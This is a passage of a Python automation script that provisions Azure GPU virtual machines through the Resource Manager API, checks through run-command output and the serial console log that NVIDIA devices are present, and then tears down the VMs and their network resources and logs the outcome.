                if q:
                    device['nvidia_smi_query'] = q.group(1)[:500]
                ml = re.search(r'---LSPCI---(.*?)(?:---SYSFS---|C211_I125519_RC_END)', txt, re.S)
                if ml:
                    device['lspci'] = ml.group(1).strip()[:2000]
                ms = re.search(r'---SYSFS---(.*?)(?:---DEV---|C211_I125519_RC_END)', txt, re.S)
                if ms:
                    device['sysfs_10de'] = ms.group(1).strip()[:2000]
                break
            if 'DONE' in txt and 'NO_NVIDIA_SMI' in txt and 'NO_SMI_QUERY' in txt and i >= 6:
                # driver install finished but no device: keep one more round for the record
                pass
            if 'DONE' in txt and i >= 3:
                # finished marker seen; still retry briefly for UUIDs
                pass
            time.sleep(20)
        att['runcommand'] = rc_all
        att['uuids'] = uuids
        # serial console fallback
        if not uuids:
            ss, sb, _ = jcall(tok, 'POST', '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}/retrieveBootDiagnosticsData?api-version=2024-07-01'.format(ARM, sub, rgname, vm))
            serial = {'retrieve_http': ss}
            surl = (sb.get('serialConsoleLogBlobUri') if isinstance(sb, dict) else None)
            serial['has_serial_uri'] = bool(surl)
            if surl:
                try:
                    with urllib.request.urlopen(urllib.request.Request(surl, headers={'User-Agent': 'c211'}), timeout=90) as rr2:
                        txt = rr2.read().decode('utf8', 'replace')
                    serial['bytes'] = len(txt)
                    serial['gpu_lines'] = [l for l in txt.split('\n') if re.search(r'(?i)nvidia|tesla|k80|GPU-', l)][:10]
                    uu2 = sorted(set(re.findall(r'GPU-[0-9a-fA-F-]{16,}', txt)))
                    if uu2:
                        uuids = uu2
                        device['gpu_uuids'] = uu2
                except Exception as e:  # noqa: BLE001
                    serial['fetch_error'] = repr(e)
            device['serial'] = serial
            att['serial'] = serial
        # independent readback
        stget, vget, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm))
        stl, lst, _ = jget(tok, '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01'.format(ARM, sub, rgname))
        att['readback'] = {'vm_get_http': stget,
                           'vm_size': (((vget.get('properties') or {}).get('hardwareProfile') or {}).get('vmSize')) if stget == 200 else None,
                           'provisioning_state': ((vget.get('properties') or {}).get('provisioningState')) if stget == 200 else None,
                           'priority': (((vget.get('properties') or {}).get('priority'))) if stget == 200 else None,
                           'tags': (vget.get('tags') or {}) if stget == 200 else None,
                           'vm_list_http': stl,
                           'present_in_list': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else None}
        p('C211_%s|step=readback|sku=%s|get=%s|present=%s|size=%s|uuids=%s' % (
            INTENT, sku, stget, att['readback']['present_in_list'], att['readback']['vm_size'], uuids))
        device['proven'] = bool(device['gpu_uuids'])
        att['teardown'] = delete_until_gone(tok, vmurl, vmurl)
        p('C211_%s|step=vm_teardown|sku=%s|%s' % (INTENT, sku, json.dumps(att['teardown'])))
        return 'proven' if uuids else 'no-device'

    if qualified:
        order = []
        order.append((qualified[0]['sku'], qualified[0]['region'], False, 'qualified-on-demand'))
        # NC12 in another qualified region (only if a different region/SKU pair qualifies)
        alt = next((q for q in qualified if q['sku'] == 'Standard_NC12' and q['region'] != qualified[0]['region']), None) \
            or next((q for q in qualified if q['region'] != qualified[0]['region']), None)
        if alt:
            order.append((alt['sku'], alt['region'], False, 'qualified-on-demand-alt'))
        for sku, reg, spot, why in order:
            res = do_attempt(sku, reg, spot, why)
            if res == 'proven' or res == 'no-device':
                break  # one marker only: stop after the first VM that actually provisioned
        # spot only after verbatim on-demand refusal of the qualified ladder
        if not device['proven'] and all(a.get('vm_put', {}).get('status') not in (200, 201) for a in attempts if a.get('vm_put')):
            reg0 = qualified[0]['region']
            if free_nc(reg0) > 0:
                do_attempt('Standard_NC6', reg0, True, 'spot-after-on-demand-refusal')
    else:
        # exactly ONE confirmation attempt: NC6 on-demand in the biggest free-NC region
        reg0 = free_regions[0] if free_regions else (rgloc or 'northeurope')
        do_attempt('Standard_NC6', reg0, False, 'confirmation-attempt-no-sku-offered')

    # ---- H. final teardown + absence ----
    fin = {'vms': [], 'nets': []}
    for vm in vm_names:
        url = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Compute/virtualMachines/{3}?api-version=2024-07-01'.format(ARM, sub, rgname, vm)
        fin['vms'].append({'name': vm, **delete_until_gone(tok, url, url)})
    for region, rec in nets.items():
        nurl = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/networkInterfaces/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, rec['nic'])
        d1 = delete_until_gone(tok, nurl, nurl)
        vurl = '{0}/subscriptions/{1}/resourceGroups/{2}/providers/Microsoft.Network/virtualNetworks/{3}?api-version=2024-01-01'.format(ARM, sub, rgname, rec['vnet'])
        d2 = delete_until_gone(tok, vurl, vurl, tries=50, gap=5)
        fin['nets'].append({'region': region, 'nic': {'name': rec['nic'], **d1},
                            'vnet': {'name': rec['vnet'], **d2}})
    fin['resources_after'] = own_resources(tok, sub, rgname)
    R['final_teardown'] = fin
    p('C211_%s|step=final_left|ours=%s' % (INTENT, json.dumps((fin.get('resources_after') or {}).get('ours'))[:600]))

    R['status'] = 'READY' if device.get('proven') else 'GATE'
    p('C211_%s|step=STATUS|%s|uuids=%s|attempts=%s' % (
        INTENT, R['status'], json.dumps(device.get('gpu_uuids')),
        json.dumps([{'sku': a.get('sku'), 'region': a.get('region'), 'spot': a.get('spot'),
                     'put': (a.get('vm_put') or {}).get('status'),
                     'err': (a.get('vm_put') or {}).get('err'),
                     'prov': a.get('provisioning_state')} for a in attempts])[:2500]))
    emit(R)


if __name__ == '__main__':
    try:
        main()
    except Exception as ex:  # noqa: BLE001
        import traceback
        p('C211_%s|FATAL|%r' % (INTENT, ex))
        traceback.print_exc()
        try:
            emit({'fatal': repr(ex)})
        except Exception:  # noqa: BLE001
            pass
